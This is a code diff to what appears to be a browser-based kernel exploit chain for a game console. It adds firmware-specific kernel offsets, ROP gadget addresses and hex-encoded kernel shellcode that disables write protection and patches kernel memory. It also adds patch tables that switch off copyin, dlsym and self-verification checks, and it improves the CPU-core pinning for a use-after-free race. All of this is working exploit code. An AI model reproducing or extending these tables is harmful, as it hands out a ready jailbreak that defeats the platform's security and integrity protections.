@@ -48,6 +48,24 @@ const S = {
    written once. The 13.52 column was derived from the two kernel images
    offline and cross-checked against a second method per value. */
 const FIRMWARE = {
+  "14.00": {
+    anchor:    0x00e6c60,   /* the lock the leak hands us */
+    swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
+    prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
+    rootvnode: 0x2136e90,
+    padding:   0x0b39d98,   /* start of the zero run behind kernel text */
+    ghKmem:    0x0466540,
+  },
+  "13.52": {
+    anchor:    0x00e6c60,   /* same function, same place */
+    swap_rbp:  0x0a80c98,   /* 4e 95 c3, the only match in text */
+    prison0:   0x111fa18,   /* same, decoded from the same instruction */
+    rootvnode: 0x2136e90,
+    padding:   0x0b39ad8,
+    ghKmem:    0x0466290,
+  },
+
+  /* 13.00 through 13.50 are confirmed on hardware. */
   "13.00": {
     anchor:    0x00e6c20,
     swap_rbp:  0x0a803c8,
@@ -55,6 +73,30 @@ const FIRMWARE = {
     rootvnode: 0x2136e90,
     padding:   0x0b39218,
     ghKmem:    0x0465a40,
+  },
+  "13.02": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a803c8,
+    prison0:   0x111fa18,
+    rootvnode: 0x2136e90,
+    padding:   0x0b39218,
+    ghKmem:    0x0465a50,
+  },
+  "13.04": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a803c8,
+    prison0:   0x111fa18,
+    rootvnode: 0x2136e90,
+    padding:   0x0b39218,
+    ghKmem:    0x0465a50,
+  },
+  "13.50": {
+    anchor:    0x00e6c20,
+    swap_rbp:  0x0a80838,
+    prison0:   0x111fa18,
+    rootvnode: 0x2136e90,
+    padding:   0x0b39658,
+    ghKmem:    0x0465e90,
   },
   "12.00": {
     anchor:    0x00e6c20,
@@ -136,6 +178,42 @@ const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/d
    is one blob per firmware. Between 13.52 and 14.00 exactly two of its ten
    write targets moved -- the two 0x33 -> 0x37 immediates. */
 const BOOTSTRAP_TABLE = {
+  "14.00":
+      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "13.52":
+      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6813aa81f0037c6813da81f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "13.00":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6817aa71f0037c6817da71f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "13.02":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6818aa71f0037c6818da71f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "13.04":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6818aa71f0037c6818da71f00370f"
+    + "20c0480d000001000f22c031c0c3",
+  "13.50":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+    + "488991882d1001c781ac2d100101000000c6819aa71f0037c6819da71f00370f"
+    + "20c0480d000001000f22c031c0c3",
   "12.00":
     "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
     + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
@@ -160,12 +238,6 @@ const BOOTSTRAP_TABLE = {
     + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
     + "488991882d1001c781ac2d100101000000c6815aa71f0037c6815da71f00370f"
     + "20c0480d000001000f22c031c0c3",
-  "13.00":
-    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
-    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
-    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-    + "488991882d1001c781ac2d100101000000c6817aa71f0037c6817da71f00370f"
-    + "20c0480d000001000f22c031c0c3",
 };
 
 let BOOTSTRAP = null;
@@ -188,6 +260,108 @@ function setFirmware(fw) {
 }
 
 const PATCH_TABLE = {
+  "14.00": [
+  [0x0000acd, "eb",       "bcopy"],
+  [0x02bd79d, "eb",       "bzero"],
+  [0x02bd7e1, "eb",       "pagezero"],
+  [0x02bd85d, "eb",       "memcpy"],
+  [0x02bd8a1, "eb",       "pagecopy"],
+  [0x02bda4d, "eb",       "copyin"],
+  [0x02bdefd, "eb",       "copyinstr"],
+  [0x02bdfcd, "eb",       "copystr"],
+  [0x01b7a43, "eb04",     "dlsym, first check"],
+  [0x01b7a53, "eb04",     "dlsym, second check"],
+  [0x01b7a73, "90e9",     "dlsym, nop and jump"],
+  [0x01b7504, "90e9",     "load_prx"],
+  [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
+  [0x0628684, "eb00",     "self verification"],
+  [0x0628f6f, "eb00",     "delayed panic on suspend"],
+  ],
+  "13.52": [
+  [0x0000acd, "eb",       "bcopy"],
+  [0x02bd4ed, "eb",       "bzero"],
+  [0x02bd531, "eb",       "pagezero"],
+  [0x02bd5ad, "eb",       "memcpy"],
+  [0x02bd5f1, "eb",       "pagecopy"],
+  [0x02bd79d, "eb",       "copyin"],
+  [0x02bdc4d, "eb",       "copyinstr"],
+  [0x02bdd1d, "eb",       "copystr"],
+  [0x01b77a3, "eb04",     "dlsym, first check"],
+  [0x01b77b3, "eb04",     "dlsym, second check"],
+  [0x01b77d3, "90e9",     "dlsym, nop and jump"],
+  [0x01b7264, "90e9",     "load_prx"],
+  [0x01b7818, "90e93c01", "dlsym, open it to every caller"],
+  [0x06283c4, "eb00",     "self verification"],
+  [0x0628caf, "eb00",     "delayed panic on suspend"],
+  ],
+  "13.00": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd42d, "eb",        "bzero"],
+  [0x02bd471, "eb",        "pagezero"],
+  [0x02bd4ed, "eb",        "memcpy"],
+  [0x02bd531, "eb",        "pagecopy"],
+  [0x02bd6dd, "eb",        "copyin"],
+  [0x02bdb8d, "eb",        "copyinstr"],
+  [0x02bdc5d, "eb",        "copystr"],
+  [0x01b76e3, "eb04",      "dlsym, first check"],
+  [0x01b76f3, "eb04",      "dlsym, second check"],
+  [0x01b7713, "90e9",      "dlsym, nop and jump"],
+  [0x01b71a4, "90e9",      "load_prx"],
+  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627b84, "eb00",      "self verification"],
+  [0x062846f, "eb00",      "delayed panic on suspend"],
+  ],
+  "13.02": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd43d, "eb",        "bzero"],
+  [0x02bd481, "eb",        "pagezero"],
+  [0x02bd4fd, "eb",        "memcpy"],
+  [0x02bd541, "eb",        "pagecopy"],
+  [0x02bd6ed, "eb",        "copyin"],
+  [0x02bdb9d, "eb",        "copyinstr"],
+  [0x02bdc6d, "eb",        "copystr"],
+  [0x01b76f3, "eb04",      "dlsym, first check"],
+  [0x01b7703, "eb04",      "dlsym, second check"],
+  [0x01b7723, "90e9",      "dlsym, nop and jump"],
+  [0x01b71b4, "90e9",      "load_prx"],
+  [0x01b7768, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627b84, "eb00",      "self verification"],
+  [0x062846f, "eb00",      "delayed panic on suspend"],
+  ],
+  "13.04": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd43d, "eb",        "bzero"],
+  [0x02bd481, "eb",        "pagezero"],
+  [0x02bd4fd, "eb",        "memcpy"],
+  [0x02bd541, "eb",        "pagecopy"],
+  [0x02bd6ed, "eb",        "copyin"],
+  [0x02bdb9d, "eb",        "copyinstr"],
+  [0x02bdc6d, "eb",        "copystr"],
+  [0x01b76f3, "eb04",      "dlsym, first check"],
+  [0x01b7703, "eb04",      "dlsym, second check"],
+  [0x01b7723, "90e9",      "dlsym, nop and jump"],
+  [0x01b71b4, "90e9",      "load_prx"],
+  [0x01b7768, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627b84, "eb00",      "self verification"],
+  [0x062846f, "eb00",      "delayed panic on suspend"],
+  ],
+  "13.50": [
+  [0x0000acd, "eb",        "bcopy"],
+  [0x02bd44d, "eb",        "bzero"],
+  [0x02bd491, "eb",        "pagezero"],
+  [0x02bd50d, "eb",        "memcpy"],
+  [0x02bd551, "eb",        "pagecopy"],
+  [0x02bd6fd, "eb",        "copyin"],
+  [0x02bdbad, "eb",        "copyinstr"],
+  [0x02bdc7d, "eb",        "copystr"],
+  [0x01b7703, "eb04",      "dlsym, first check"],
+  [0x01b7713, "eb04",      "dlsym, second check"],
+  [0x01b7733, "90e9",      "dlsym, nop and jump"],
+  [0x01b71c4, "90e9",      "load_prx"],
+  [0x01b7778, "90e93c01",  "dlsym, open it to every caller"],
+  [0x0627fc4, "eb00",      "self verification"],
+  [0x06288af, "eb00",      "delayed panic on suspend"],
+  ],
   "12.00": [
   [0x0000acd, "eb",        "bcopy"],
   [0x02bd3cd, "eb",        "bzero"],
@@ -255,23 +429,6 @@ const PATCH_TABLE = {
   [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
   [0x0627b34, "eb00",      "self verification"],
   [0x062841f, "eb00",      "delayed panic on suspend"],
-  ],
-  "13.00": [
-  [0x0000acd, "eb",        "bcopy"],
-  [0x02bd42d, "eb",        "bzero"],
-  [0x02bd471, "eb",        "pagezero"],
-  [0x02bd4ed, "eb",        "memcpy"],
-  [0x02bd531, "eb",        "pagecopy"],
-  [0x02bd6dd, "eb",        "copyin"],
-  [0x02bdb8d, "eb",        "copyinstr"],
-  [0x02bdc5d, "eb",        "copystr"],
-  [0x01b76e3, "eb04",      "dlsym, first check"],
-  [0x01b76f3, "eb04",      "dlsym, second check"],
-  [0x01b7713, "90e9",      "dlsym, nop and jump"],
-  [0x01b71a4, "90e9",      "load_prx"],
-  [0x01b7758, "90e93c01",  "dlsym, open it to every caller"],
-  [0x0627b84, "eb00",      "self verification"],
-  [0x062846f, "eb00",      "delayed panic on suspend"],
   ],
 };
 
@@ -916,16 +1073,36 @@ function pinCore() {
   let rv = sc(S.cpuset_getaffinity, 3, 1, -1, 16, mask.at).i32;
   if (rv !== 0) return { ok: false, note: "getaffinity rv=" + rv };
 
-  let core = -1, allowed = [];
+  const allowed = [];
   for (let b = 0; b < 128; b++) {
-    if ((mask.u8[b >> 3] >> (b & 7)) & 1) { if (core < 0) core = b; allowed.push(b); }
+    if ((mask.u8[b >> 3] >> (b & 7)) & 1) allowed.push(b);
   }
-  if (core < 0) return { ok: false, note: "no core in the mask" };
+  if (!allowed.length) return { ok: false, note: "no core in the mask" };
 
-  mask.u8.fill(0);
-  mask.u8[core >> 3] = 1 << (core & 7);
-  rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
-  return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
+  /* Every allowed core in turn, not just the lowest. On 04.11. setaffinity
+     answered -1 although [6,7] were allowed, and the run gave up without
+     ever having tried 7. Which core it ends up on does not matter -- all
+     that is needed is that the free and the refill land on the same one. */
+  const versuche = [];
+  for (let i = 0; i < allowed.length; i++) {
+    const core = allowed[i];
+    mask.u8.fill(0);
+    mask.u8[core >> 3] = 1 << (core & 7);
+    rv = sc(S.cpuset_setaffinity, 3, 1, -1, 16, mask.at).i32;
+    versuche.push(core + ":rv" + rv);
+    if (rv === 0) {
+      return {
+        ok: true, core: core, allowed: allowed.join(","),
+        note: versuche.length > 1
+          ? "setaffinity ok after " + versuche.join(" ")
+          : "setaffinity rv=0",
+      };
+    }
+  }
+  return {
+    ok: false, allowed: allowed.join(","),
+    note: "every allowed core refused: " + versuche.join(" "),
+  };
 }
 
 /* ------------------------------------------------------- the payload */
